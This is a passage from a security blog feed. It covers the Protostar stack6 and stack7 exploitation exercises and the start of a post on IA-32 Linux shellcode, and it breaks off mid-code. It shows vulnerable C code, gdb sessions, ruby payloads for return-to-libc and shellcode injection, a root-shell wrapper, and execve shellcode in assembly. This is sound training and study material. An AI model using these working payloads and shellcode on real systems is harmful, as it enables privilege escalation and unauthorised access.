<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">getpath</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">ret</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;input path please: &quot;</span><span class="p">);</span> <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">ret</span> <span class="o">=</span> <span class="n">__builtin_return_address</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">((</span><span class="n">ret</span> <span class="o">&amp;</span> <span class="mh">0xbf000000</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0xbf000000</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;bzzzt (%p)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">ret</span><span class="p">);</span>
</span><span class='line'>      <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;got path %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="n">getpath</span><span class="p">();</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Using <code>pattern_create.rb</code> / <code>pattern_offset.rb</code> we found out that the stored return address is at offset 80.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ gdb -q /opt/protostar/bin/stack6 
</span><span class='line'>...
</span><span class='line'>
</span><span class='line'>gdb> b main
</span><span class='line'>Breakpoint 1 at 0x8048500: file stack6/stack6.c, line 27.
</span><span class='line'>
</span><span class='line'>gdb> r
</span><span class='line'>...
</span><span class='line'>Breakpoint 1, main (argc=0x1, argv=0xbffff804) at stack6/stack6.c:27
</span><span class='line'>27    stack6/stack6.c: No such file or directory.
</span><span class='line'>  in stack6/stack6.c
</span><span class='line'>
</span><span class='line'>gdb> p system
</span><span class='line'>$1 = {&lt;text variable, no debug info>} 0xb7ecffb0 &lt;__libc_system></span></code></pre></td></tr></table></div></figure>


<p>There is a great <a href="http://css.csail.mit.edu/6.858/2014/readings/return-to-libc.pdf">return-to-libc writeup</a>
to explain the stack structure.</p>

<p>Address of <code>system()</code> is always the same, <code>0xb7ecffb0</code>, now we need to find the
<code>/bin/sh</code> string on the stack.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~/fixenv$ ./r.sh gdb /opt/protostar/bin/stack6 
</span><span class='line'>...
</span><span class='line'>(gdb) set disassembly-flavor intel 
</span><span class='line'>
</span><span class='line'>(gdb) b main
</span><span class='line'>Breakpoint 1 at 0x8048500: file stack6/stack6.c, line 27.
</span><span class='line'>
</span><span class='line'>(gdb) r
</span><span class='line'>Starting program: /home/user/fixenv/.launcher 
</span><span class='line'>
</span><span class='line'>(gdb) x /10s $esp
</span><span class='line'>...
</span><span class='line'>0xbfffff0e:    "6:*.wav=00;36:*.axa=00;36:*.oga=00;36:*.spx=00;36:*.xspf=00;36:"
</span><span class='line'>0xbfffff4e:    "SHELL=/bin/sh"
</span><span class='line'>
</span><span class='line'>(gdb) x /s 0xbfffff4e+6
</span><span class='line'>0xbfffff54:    "/bin/sh"</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~/fixenv$ (ruby -e 'print "A"*80 + [0xb7ecffb0].pack("V") + "FAKE" + [0xbfffff54].pack("V")'; cat -) | ./r.sh /opt/protostar/bin/stack6 
</span><span class='line'>input path please: 
</span><span class='line'>got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA???AAAAAAAAAAAA???FAKET???
</span><span class='line'>id
</span><span class='line'>uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)</span></code></pre></td></tr></table></div></figure>


<p>Without <code>setreuid()</code> call we have only <code>euid=0</code>, so we prepare this shell wrapper:</p>

<figure class='code'><figcaption><span>escalate.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>        <span class="n">setreuid</span><span class="p">(</span><span class="n">geteuid</span><span class="p">(),</span> <span class="n">geteuid</span><span class="p">());</span>
</span><span class='line'>        <span class="n">execv</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~/fixenv$ (ruby -e 'print "A"*80 + [0xb7ecffb0].pack("V") + "FAKE" + [0xbfffff54].pack("V")'; cat -) | ./r.sh /opt/protostar/bin/stack6 
</span><span class='line'>input path please: 
</span><span class='line'>got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA???AAAAAAAAAAAA???FAKET???
</span><span class='line'>id
</span><span class='line'>uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
</span><span class='line'>/tmp/escalate
</span><span class='line'>id
</span><span class='line'>uid=0(root) gid=1001(user) groups=0(root),1001(user)</span></code></pre></td></tr></table></div></figure>


<h2>Protostar Stack7</h2>

<figure class='code'><figcaption><span>stack7.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">char</span> <span class="o">*</span><span class="nf">getpath</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">ret</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;input path please: &quot;</span><span class="p">);</span> <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">ret</span> <span class="o">=</span> <span class="n">__builtin_return_address</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">((</span><span class="n">ret</span> <span class="o">&amp;</span> <span class="mh">0xb0000000</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0xb0000000</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;bzzzt (%p)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">ret</span><span class="p">);</span>
</span><span class='line'>      <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;got path %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">strdup</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="n">getpath</span><span class="p">();</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ gdb -q /opt/protostar/bin/stack7
</span><span class='line'>Really redefine built-in command "frame"? (y or n) [answered Y; input not from terminal]
</span><span class='line'>Really redefine built-in command "thread"? (y or n) [answered Y; input not from terminal]
</span><span class='line'>Really redefine built-in command "start"? (y or n) [answered Y; input not from terminal]
</span><span class='line'>Reading symbols from /opt/protostar/bin/stack7...done.
</span><span class='line'>gdb> r
</span><span class='line'>input path please: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9
</span><span class='line'>got path Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9
</span><span class='line'>
</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'>_______________________________________________________________________________
</span><span class='line'>     eax:0804A008 ebx:B7FD7FF4  ecx:00000000  edx:00000001     eflags:00210202
</span><span class='line'>     esi:00000000 edi:00000000  esp:BFFFF750  ebp:63413563     eip:37634136
</span><span class='line'>     cs:0073  ds:007B  es:007B  fs:0000  gs:0033  ss:007B    o d I t s z a p c 
</span><span class='line'>[007B:BFFFF750]---------------------------------------------------------[stack]
</span><span class='line'>BFFFF780 : 01 00 00 00  C0 F7 FF BF - 26 06 FF B7  B0 FA FF B7 ........&.......
</span><span class='line'>BFFFF770 : 38 41 64 39  00 FF FF FF - F4 EF FF B7  BC 82 04 08 8Ad9............
</span><span class='line'>BFFFF760 : 64 33 41 64  34 41 64 35 - 41 64 36 41  64 37 41 64 d3Ad4Ad5Ad6Ad7Ad
</span><span class='line'>BFFFF750 : 41 63 38 41  63 39 41 64 - 30 41 64 31  41 64 32 41 Ac8Ac9Ad0Ad1Ad2A
</span><span class='line'>[007B:0804A008]---------------------------------------------------------[ data]
</span><span class='line'>0804A008 : 41 61 30 41  61 31 41 61 - 32 41 61 33  41 61 34 41 Aa0Aa1Aa2Aa3Aa4A
</span><span class='line'>0804A018 : 61 35 41 61  36 41 61 37 - 41 61 38 41  61 39 41 62 a5Aa6Aa7Aa8Aa9Ab
</span><span class='line'>[0073:37634136]---------------------------------------------------------[ code]
</span><span class='line'>0x37634136:   Error while running hook_stop:
</span><span class='line'>Cannot access memory at address 0x37634136
</span><span class='line'>0x37634136 in ?? ()
</span><span class='line'>
</span><span class='line'>gdb> i r
</span><span class='line'>eax            0x804a008  0x804a008
</span><span class='line'>ecx            0x0    0x0
</span><span class='line'>edx            0x1    0x1
</span><span class='line'>ebx            0xb7fd7ff4 0xb7fd7ff4
</span><span class='line'>esp            0xbffff750 0xbffff750
</span><span class='line'>ebp            0x63413563 0x63413563
</span><span class='line'>esi            0x0    0x0
</span><span class='line'>edi            0x0    0x0
</span><span class='line'>eip            0x37634136 0x37634136
</span><span class='line'>eflags         0x210202   [ IF RF ID ]
</span><span class='line'>cs             0x73   0x73
</span><span class='line'>ss             0x7b   0x7b
</span><span class='line'>ds             0x7b   0x7b
</span><span class='line'>es             0x7b   0x7b
</span><span class='line'>fs             0x0    0x0
</span><span class='line'>gs             0x33   0x33
</span><span class='line'>gdb> x /s $eax
</span><span class='line'>0x804a008:     "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9"</span></code></pre></td></tr></table></div></figure>


<p>The offset for return address is again 80 (0x37634136 in <code>pattern_offset</code>) and
<code>EAX</code> with stored <code>0x804a008</code> value points to the beginning of our buffer,
where we still can jump.</p>

<p>This is because <code>strdup()</code> allocates memory on heap and returns this address:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>man 3 strdup
</span><span class='line'>
</span><span class='line'>  The strdup() function returns a pointer to a new string which is a duplicate
</span><span class='line'>  of the string s.  Memory for the new string  is obtained with malloc(3), and
</span><span class='line'>  can be freed with free(3).</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ (ruby -e 'sc="\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x31\xd2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"; print sc + "X" * (80 - sc.length) + [0x0804a008].pack("V")'; cat -) | /opt/protostar/bin/stack7 
</span><span class='line'>input path please: 
</span><span class='line'>got path j1X̀?É?jFX̀1?1?Phn/shh//bi??PS??
</span><span class='line'>                                       ̀XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX?
</span><span class='line'>id
</span><span class='line'>uid=0(root) gid=1001(user) groups=0(root),1001(user)</span></code></pre></td></tr></table></div></figure>


<p>Instead of pointing to the allocated buffer address, it is more portable to
find <code>call eax</code> instruction addresses in code and use one of them.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ objdump -M intel -D /opt/protostar/bin/stack7 | grep 'call.*eax$'
</span><span class='line'> 80484bf: ff d0                   call   eax
</span><span class='line'> 80485eb: ff d0                   call   eax</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ (ruby -e 'sc="\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x31\xd2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"; print sc + "X" * (80 - sc.length) + [0x080484bf].pack("V")'; cat -) | /opt/protostar/bin/stack7 
</span><span class='line'>input path please: 
</span><span class='line'>got path j1X̀?É?jFX̀1?1?Phn/shh//bi??PS??
</span><span class='line'>                                       ̀XXXXXXXXXXXXXXXXXXXXXXXXX?XXXXXXXXXXXX??
</span><span class='line'>id
</span><span class='line'>uid=0(root) gid=1001(user) groups=0(root),1001(user)</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[IA-32 Linux Shellcode Basics 2]]></title>
    <link href="http://73696e65.github.io/blog/2015/06/26/ia-32-linux-shellcode-basics-2/"/>
    <updated>2015-06-26T11:08:30+02:00</updated>
    <id>http://73696e65.github.io/blog/2015/06/26/ia-32-linux-shellcode-basics-2</id>
    <content type="html"><![CDATA[<p>Starting with the ASM code that is position dependent:</p>

<figure class='code'><figcaption><span>shell1.asm </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='asm'><span class='line'><span class="nf">section</span> <span class="no">.data</span>
</span><span class='line'><span class="nf">cmd</span> <span class="no">db</span> <span class="err">&#39;/</span><span class="no">bin</span><span class="err">/</span><span class="no">sh</span><span class="err">&#39;</span><span class="p">,</span><span class="mi">0x0</span>
</span><span class='line'>
</span><span class='line'><span class="nf">section</span> <span class="no">.text</span>
</span><span class='line'><span class="nf">global</span> <span class="no">_start</span>
</span><span class='line'><span class="nl">_start:</span>
</span><span class='line'>
</span><span class='line'><span class="err">;</span><span class="nf">execve</span><span class="p">(</span><span class="err">&quot;/</span><span class="no">bin</span><span class="err">/</span><span class="no">sh</span><span class="err">&quot;</span><span class="p">,</span> <span class="err">{&quot;/</span><span class="no">bin</span><span class="err">/</span><span class="no">sh</span><span class="err">&quot;</span><span class="p">,</span> <span class="no">NULL</span><span class="err">}</span><span class="p">,</span> <span class="no">NULL</span><span class="p">)</span>
</span><span class='line'><span class="nf">mov</span> <span class="no">eax</span><span class="p">,</span> <span class="mi">11</span>
</span><span class='line'><span class="nf">lea</span> <span class="no">ebx</span><span class="p">,</span> <span class="err">[</span><span class="no">cmd</span><span class="err">]</span>
</span><span class='line'><span class="nf">mov</span> <span class="no">ecx</span><span class="p">,</span> <span class="mi">0</span>
</span><span class='line'><span class="nf">push</span> <span class="no">ecx</span>
</span><span class='line'><span class="nf">push</span> <span class="no">ebx</span>
</span><span class='line'><span class="nf">mov</span> <span class="no">ecx</span><span class="p">,</span> <span class="no">esp</span>
</span><span class='line'><span class="nf">mov</span> <span class="no">edx</span><span class="p">,</span> <span class="mi">0</span>
</span><span class='line'><span class="nf">int</span> <span class="mi">0x80</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/tmp# nasm -f elf shell1.asm; ld shell1.o -o shell1
</span><span class='line'>
</span><span class='line'>root@kali32:/tmp# ./shell1 
</span><span class='line'>#</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/tmp# objdump -M intel -d shell1
</span><span class='line'>
</span><span class='line'>shell1:     file format elf32-i386
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Disassembly of section .text:
</span><span class='line'>
</span><span class='line'>08048080 &lt;_start>:
</span><span class='line'> 8048080: b8 0b 00 00 00          mov    eax,0xb
</span><span class='line'> 8048085: 8d 1d 9c 90 04 08       lea    ebx,ds:0x804909c
</span><span class='line'> 804808b: b9 00 00 00 00          mov    ecx,0x0
</span><span class='line'> 8048090: 51                      push   ecx
</span><span class='line'> 8048091: 53                      push   ebx
</span><span class='line'> 8048092: 89 e1                   mov    ecx,esp
</span><span class='line'> 8048094: ba 00 00 00 00          mov    edx,0x0
</span><span class='line'> 8048099: cd 80                   int    0x80</span></code></pre></td></tr></table></div></figure>


<p>The minimalistic shell could look like <code>execve("/bin/sh", NULL, NULL)</code>.
However, according documentation it&rsquo;s not portable among UNIX systems:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>man 2 execve
</span><span class='line'>
</span><span class='line'>  On Linux, argv can be specified as NULL, which has the same effect as
</span><span class='line'>  specifying this argument as a pointer to a list containing a single NULL
</span><span class='line'>  pointer.  Do not take advantage of this  misfea‐ ture!  It is nonstandard and
</span><span class='line'>  nonportable: on most other UNIX systems doing this will result in an error
</span><span class='line'>  (EFAULT).</span></code></pre></td></tr></table></div></figure>


<p>Again, the same procedure. We need to get rid of absolute address reference and
NULL bytes.</p>

<figure class='code'><figcaption><span>shell2.asm </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='asm'><span class='line'><span class="nf">section</span> <span class="no">.text</span>
</span><span class='line'><span class="nf">global</span> <span class="no">_start</span>
</span><span class='line'><span class="nl">_start:</span>
</span><span class='line'>
</span><span class='line'><span class="err">;</span><span class="nf">execve</span><span class="p">(</span><span class="err">&quot;/</span><span class="no">bin</span><span class="err">/</span><span class="no">sh</span><span class="err">&quot;</span><span class="p">,</span> <span class="err">{&quot;/</span><span class="no">bin</span><span class="err">/</span><span class="no">sh</span><span class="err">&quot;</span><span class="p">,</span> <span class="no">NULL</span><span class="err">}</span><span class="p">,</span> <span class="no">NULL</span><span class="p">)</span>
</span><span class='line'><span class="nf">xor</span> <span class="no">eax</span><span class="p">,</span> <span class="no">eax</span>
</span><span class='line'><span class="nf">xor</span> <span class="no">edx</span><span class="p">,</span> <span class="no">edx</span>
</span><span class='line'>
</span><span class='line'><span class="nf">push</span> <span class="no">eax</span> <span class="err">;</span> <span class="err">\</span><span class="mi">0</span>
</span><span class='line'><span class="nf">push</span> <span class="err">&#39;</span><span class="no">n</span><span class="err">/</span><span class="no">sh</span><span class="err">&#39;</span>
</span><span class='line'><span class="nf">push</span> <span class="err">&#39;//</span><span class="no">bi</span><span class="err">&#39;</span>
</span><span class='line'><span class="nf">mov</span> <span class="no">ebx</span><span class="p">,</span> <span class="no">esp</span>
</span><span class='line'>
</span><span class='line'><span class="nf">push</span> <span class="no">eax</span> <span class="err">;</span> <span class="err">\</span><span class="mi">0</span>
</span><span class='line'><span class="nf">push</span> <span class="no">ebx</span> <span class="err">;</span> <span class="err">/</span><span class="no">bin</span><span class="err">/</span><span class="no">sh</span>
</span><span class='line'><span class="nf">mov</span> <span class="no">ecx</span><span class="p">,</span> <span class="no">esp</span>
</span><span class='line'>
</span><span class='line'><span class="nf">mov</span>  <span class="no">al</span><span class="p">,</span> <span class="mi">11</span>
</span><span class='line'><span class="nf">int</span> <span class="mi">0x80</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
